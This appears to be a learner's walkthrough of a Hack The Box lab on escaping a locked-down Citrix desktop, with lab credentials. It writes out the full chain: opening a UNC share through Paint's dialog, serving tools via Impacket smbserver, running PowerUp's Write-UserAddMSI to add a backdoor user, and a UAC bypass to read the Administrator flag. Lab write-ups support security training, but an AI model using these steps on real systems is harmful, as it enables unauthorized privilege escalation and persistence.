Numerous organizations leverage virtualization platforms such as Terminal Services, Citrix, AWS AppStream, CyberArk PSM and Kiosk to offer remote access solutions in order to meet their business requirements. However, in most organizations "lock-down" measures are implemented in their desktop environments to minimize the potential impact of malicious staff members and compromised accounts on overall domain security. While these desktop restrictions can impede threat actors, there remains a possibility for them to "break-out" of the restricted environment.

Basic Methodology for break-out:

1. Gain access to a `Dialog Box`.
2. Exploit the Dialog Box to achieve `command execution`.
3. `Escalate privileges` to gain higher levels of access.

Submit the user flag from C:\Users\pmorgan\Downloads

Visit `http://humongousretail.com/remote/` using the RDP session of the spawned target and login with the provided credentials below. After login, click on the `Default Desktop` to obtain the Citrix `launch.ica` file in order to connect to the restricted environment.
```

        CitrixCredentials:
`Username: pmorgan Password: Summer1Summer!   Domain: htb.local`

```


Bypassing Path Restrictions

When we attempt to visit C:\Users using File Explorer, we find it is restricted and results in an error. This indicates that group policy has been implemented to restrict users from browsing directories in the C:\ drive using File Explorer. In such scenarios, it is possible to utilize windows dialog boxes as a means to bypass the restrictions imposed by group policy. Once a Windows dialog box is obtained, the next step often involves navigating to a folder path containing native executables that offer interactive console access (i.e.: cmd.exe). Usually, we have the option to directly enter the folder path into the file name field to gain access to the file.

Run ms paint > go to open > paste this in the file path "\\127.0.0.1\c$\users\pmorgan\Downloads" > right click the flag.txt > open > notepad .


Submit the Administrator's flag from C:\Users\Administrator\Desktop

remember you should run this cmd from tools dir only so that we can access tools from the citrix.

==tip : for switching between citrix and ubuntu use ctrl + alt + arrow keys .==


```
htb-student@ubuntu:~$ sudo su
[sudo] password for htb-student: 
root@ubuntu:/home/htb-student# smbserver.py -smb2support share $(pwd)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

access the share using Run `Paint` from start menu and click on `File > Open` to open the Dialog Box. 

run this in the dialog box , make sure files to all files is selected.


```
\\10.13.38.95\share
```

then right click open 

```
pwn.exe
```

```
powershell -ep bypass 
```

to start a new powershell instance.

```
cd C:\\Users\pmorgan\Desktop ;xcopy\\10.13.38.95\share\PowerUp.ps1 . 


Import-module .\PowerUp.ps1
Write-UserAddMSI


```

now there will be a adduser.msi available in the desktop double click and creat a backdoor user with a password which matches the password policy.

```
runas /user:backdoor cmd
enter password: 
```

new cmd instance will open wth admin priv

```
powershell -ep bypass
```

navigate to users\public folder and copy the uac-bypass script

```
xcopy\\10.13.38.95\share\Bypass-UAC.ps1 .


Import-Module Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep [for bypassing UAC]


type C:\Users\Administrator\Desktop\flag.txt


```
